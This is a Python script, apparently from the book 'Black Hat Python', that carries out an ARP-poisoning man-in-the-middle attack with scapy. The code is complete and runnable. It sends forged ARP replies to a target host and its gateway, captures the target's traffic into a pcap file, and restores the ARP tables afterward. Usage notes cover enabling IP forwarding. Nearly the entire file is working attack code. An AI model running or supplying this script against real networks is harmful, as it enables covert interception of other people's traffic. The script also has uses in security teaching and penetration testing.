#!/usr/bin/env python
'''
Arp-poisoning script from Black Hat Python
Tricking client into sending traffic destined
for internet gateway through attacking machine.
[Usage]
    set port forwarding:
        echo 1 > /proc/sys/net/ipv4/ip_forward
    python arp_poison.py <interface> <target_ip> <gateway_ip>
'''
import os
import sys
from scapy.all import *
import threading
import signal


interface = sys.argv[1] #'wlp2s0'
target_ip = sys.argv[2] #'192.168.1.4'
gateway_ip = sys.argv[3] #'192.168.1.1'
packet_count = 1000


conf.iface = interface
conf.verb = 0

def get_mac(ip_address):
    responses, unanswered = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip_address),
                            timeout=2, retry=10)
    for s,r in responses:
        return r[Ether].src
    return None

def restore_target(gateway_ip, gateway_mac, target_ip, target_mac):
    print("[*] Restoring target...")
    send(ARP(op=2, psrc=gateway_ip, pdst=target_ip,
         hwdst="ff:ff:ff:ff:ff:ff", hwsrc=gateway_mac), count=5)
    send(ARP(op=2, psrc=target_ip, pdst=gateway_ip,
         hwdst="ff:ff:ff:ff:ff:ff", hwsrc=target_mac), count=5)
    os.kill(os.getpid(), signal.SIGINT)

def poison_target(gateway_ip, gateway_mac, target_ip, target_mac):
    poison_target = ARP()
    poison_target.op = 2
    poison_target.psrc = gateway_ip
    poison_target.pdst = target_ip
    poison_target.hwdst = target_mac
    poison_gateway = ARP()
    poison_gateway.op = 2
    poison_gateway.psrc = target_ip
    poison_gateway.pdst = gateway_ip
    poison_gateway.hwdst = gateway_mac

    print("[*] Beginning the ARP poison. [CTRL-C to stop]")

    while True:
        try:
            send(poison_target)
            send(poison_gateway)
            time.sleep(2)
        except KeyboardInterrupt:
            restore_target(gateway_ip, gateway_mac, target_ip, target_mac)

    print("[*] ARP poison attack finished.")
    return

print("[*] Setting up {}".format(interface))

gateway_mac = get_mac(gateway_ip)

if gateway_mac is None:
    print("[!!!] Failed to get gateway MAC. Exiting.")
    sys.exit(0)
else:
    print("[*] Gateway {} is at {}".format(gateway_ip, gateway_mac))

target_mac = get_mac(target_ip)

if target_mac is None:
    print("[!!!] Failed to get target MAC. Exiting.")
    sys.exit(0)
else:
    print("[*] Target {} is at {}".format(target_ip, target_mac))


poison_thread = threading.Thread(target=poison_target, args=(gateway_ip, gateway_mac, target_ip, target_mac))
poison_thread.start()

try:
    print("[*] Starting sniffer for {} packets.".format(packet_count))
    bpf_filter = "ip host {}".format(target_ip)
    packets = sniff(count=packet_count, filter=bpf_filter, iface=interface)
    wrpcap('arper.pcap', packets)

    restore_target(gateway_ip, gateway_mac, target_ip, target_mac)
except KeyboardInterrupt:
    restore_target(gateway_ip, gateway_mac, target_ip, target_mac)
    sys.exit(0)


